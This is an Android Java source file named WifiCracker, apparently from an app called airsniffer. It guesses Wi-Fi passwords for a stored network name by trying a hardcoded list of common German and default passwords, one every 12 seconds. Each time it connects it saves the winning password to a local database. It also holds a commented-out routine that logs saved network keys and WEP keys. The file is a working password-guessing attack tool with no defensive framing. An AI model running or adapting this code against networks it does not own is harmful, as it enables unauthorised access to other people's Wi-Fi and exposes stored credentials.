package de.baensch.airsniffer.wificrack;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;

import java.util.List;

import de.baensch.airsniffer.db.DatabaseHandler;
import de.baensch.airsniffer.db.Device;

/**
 * Created by fabian on 25.01.17.
 */

public class WifiCracker {

    public final static int DELAY = 12000; //in ms

    String TAG = getClass().getSimpleName();
    boolean d = true;

    final String[] passwordsToTest = {"passwort", "123456789", "qwertz", "hallo", "0123456789", "admin", "administrator"};

    Context context;
    AsyncTask<Void, Void, String> crackTask;
    Device device;
    boolean isRunning;
    int trials;
    NetworkChangeReceiver networkChangeReceiver;

    public WifiCracker(Context context) {
        this.context = context;
        this.isRunning = false;
        trials = 0;
        networkChangeReceiver = new NetworkChangeReceiver();
        registerReceiver();
    }

    public void registerReceiver(){
        IntentFilter i = new IntentFilter();
        i.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        context.registerReceiver(networkChangeReceiver, i);
    }

    public void start(int deviceID){
        this.isRunning = true;
        DatabaseHandler databaseHandler = new DatabaseHandler(context);
        this.device = databaseHandler.getDevice(deviceID);
        if (device!=null) {
            if (d) Log.d(TAG, "Starting Cracking for: "+device.toString());
            crackTask = new CrackTask().execute();
        }else{
            if (d) Log.d(TAG, "Couldn't find Device in DB");
        }
    }

    public void stop(){
        context.unregisterReceiver(networkChangeReceiver);
        isRunning = false;
        crackTask.cancel(true);
    }

    public boolean isRunning() {
        return isRunning;
    }

    private class CrackTask extends AsyncTask<Void, Void, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            isRunning = true;
//            readWepConfig();
        }

        @Override
        protected String doInBackground(Void... params) {
            Log.d(TAG, "doInBackground - start");
            try {
                WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);

                for (int i = 0; i < passwordsToTest.length; i++) {
                    Log.d(TAG, "Test "+i + " - password: "+passwordsToTest[i]);

                    List<WifiConfiguration> list = wifiManager.getConfiguredNetworks();
                    for( WifiConfiguration configuration : list ) {
                        if(configuration.SSID != null && configuration.SSID.equals("\"" + device.getName()  + "\"")) {
//                            Log.d(TAG, "Previous Conf was: " + configuration.toString());
                            Log.d(TAG, "Disconnect as first step - if already connected");
//                            wifiManager.disconnect();
                            wifiManager.removeNetwork(configuration.networkId);
                            break;
                        }
                    }

                    WifiConfiguration conf = createConf(device.getName(), passwordsToTest[i]);
//                    Log.d(TAG, "Current Conf: "+conf.toString());

                    int networkId = wifiManager.addNetwork(conf);
                    Log.d(TAG, "wifiManager - add Network returned " + networkId );

                    if (networkId != -1){
                        boolean b = wifiManager.enableNetwork(networkId, true);
                        Log.d(TAG, "wifiManager - enableNetwork returned " + b );
                    }else{
                        continue;
                    }

                    Thread.sleep(DELAY);

                    ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
                    NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
//                    String currentNetworkType = ConnectivityManager.getNetworkTypeName(1);
                    Log.d(TAG,"Active Network ist status: "+activeNetwork.getType());
                    boolean isWiFi = activeNetwork.getType() == ConnectivityManager.TYPE_WIFI;
                    if (isWiFi){
                        Log.d(TAG, "Network Available - YESSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS");
                        Log.d(TAG, "Password was " + passwordsToTest[i]);

                        handlePositiveTrial(passwordsToTest[i]);

                        isRunning = false;
                        return null;
                    }

                }
            } catch (InterruptedException e) {
                e.printStackTrace();
                isRunning = false;
            }
            Log.d(TAG, "doInBackground - done");
            return null;
        }

        @Override
        protected void onPostExecute(String s) {
            isRunning = false;
            super.onPostExecute(s);
        }

        @Override
        protected void onCancelled() {
            isRunning = false;
            super.onCancelled();
        }

        @Override
        protected void onCancelled(String s) {
            isRunning = false;
            super.onCancelled(s);
        }

        private WifiConfiguration createConf (String ssid, String password){
            WifiConfiguration wc = new WifiConfiguration();
            wc.SSID = "\""+ssid+"\"";
            wc.preSharedKey  = "\""+password+"\"";
            wc.hiddenSSID = true;
            wc.status = WifiConfiguration.Status.ENABLED;
            wc.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
            wc.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
            wc.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
            wc.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
            wc.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
            wc.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
            return wc;
        }

        void readWepConfig()
        {
            WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            List<WifiConfiguration> configuredNetworks = wifi.getConfiguredNetworks();
            int i = configuredNetworks.size();

            for (WifiConfiguration config : configuredNetworks) {
                Log.d("WifiPreference", "----------------------------------");
                Log.d("WifiPreference", "NO OF CONFIG " + i);
                Log.d("WifiPreference", "SSID" + config.SSID);
                Log.d("WifiPreference", "PASSWORD" + config.preSharedKey);
                Log.d("WifiPreference", "ALLOWED ALGORITHMS");
                Log.d("WifiPreference", "LEAP" + config.allowedAuthAlgorithms.get(WifiConfiguration.AuthAlgorithm.LEAP));
                Log.d("WifiPreference", "OPEN" + config.allowedAuthAlgorithms.get(WifiConfiguration.AuthAlgorithm.OPEN));
                Log.d("WifiPreference", "SHARED" + config.allowedAuthAlgorithms.get(WifiConfiguration.AuthAlgorithm.SHARED));
                Log.d("WifiPreference", "GROUP CIPHERS");
                Log.d("WifiPreference", "CCMP" + config.allowedGroupCiphers.get(WifiConfiguration.GroupCipher.CCMP));
                Log.d("WifiPreference", "TKIP" + config.allowedGroupCiphers.get(WifiConfiguration.GroupCipher.TKIP));
                Log.d("WifiPreference", "WEP104" + config.allowedGroupCiphers.get(WifiConfiguration.GroupCipher.WEP104));
                Log.d("WifiPreference", "WEP40" + config.allowedGroupCiphers.get(WifiConfiguration.GroupCipher.WEP40));
                Log.d("WifiPreference", "KEYMGMT");
                Log.d("WifiPreference", "IEEE8021X" + config.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.IEEE8021X));
                Log.d("WifiPreference", "NONE" + config.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.NONE));
                Log.d("WifiPreference", "WPA_EAP" + config.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.WPA_EAP));
                Log.d("WifiPreference", "WPA_PSK" + config.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.WPA_PSK));
                Log.d("WifiPreference", "PairWiseCipher");
                Log.d("WifiPreference", "CCMP" + config.allowedPairwiseCiphers.get(WifiConfiguration.PairwiseCipher.CCMP));
                Log.d("WifiPreference", "NONE" + config.allowedPairwiseCiphers.get(WifiConfiguration.PairwiseCipher.NONE));
                Log.d("WifiPreference", "TKIP" + config.allowedPairwiseCiphers.get(WifiConfiguration.PairwiseCipher.TKIP));
                Log.d("WifiPreference", "Protocols");
                Log.d("WifiPreference", "RSN" + config.allowedProtocols.get(WifiConfiguration.Protocol.RSN));
                Log.d("WifiPreference", "WPA" + config.allowedProtocols.get(WifiConfiguration.Protocol.WPA));
                Log.d("WifiPreference", "WEP Key Strings");
                String[] wepKeys = config.wepKeys;
                Log.d("WifiPreference", "WEP KEY 0" + wepKeys[0]);
                Log.d("WifiPreference", "WEP KEY 1" + wepKeys[1]);
                Log.d("WifiPreference", "WEP KEY 2" + wepKeys[2]);
                Log.d("WifiPreference", "WEP KEY 3" + wepKeys[3]);
                Log.d("WifiPreference", "----------------------------------");
            }
        }

    }

    private void handlePositiveTrial(String password) {
        DatabaseHandler db = new DatabaseHandler(context);
        Device freshDevice = db.getDevice(device.getId());
        freshDevice.setPassword(password);
        freshDevice.setCheckedLogin(true);
        db.updateDevice(freshDevice);
    }

    public class NetworkChangeReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("NetworkChangeReceiver", "onReceive - ");
            ConnectivityManager connMgr = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo wifi = connMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

            boolean isConnected = wifi != null && wifi.isConnected() ;
            if (isConnected) {
                Log.d("NetworkChangeReceiver", "Network Available - YESSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS");
            } else {
                Log.d("NetworkChangeReceiver", "Network Available  - NOOOOOOOOOOOOOOOO");
            }
        }
    }

}
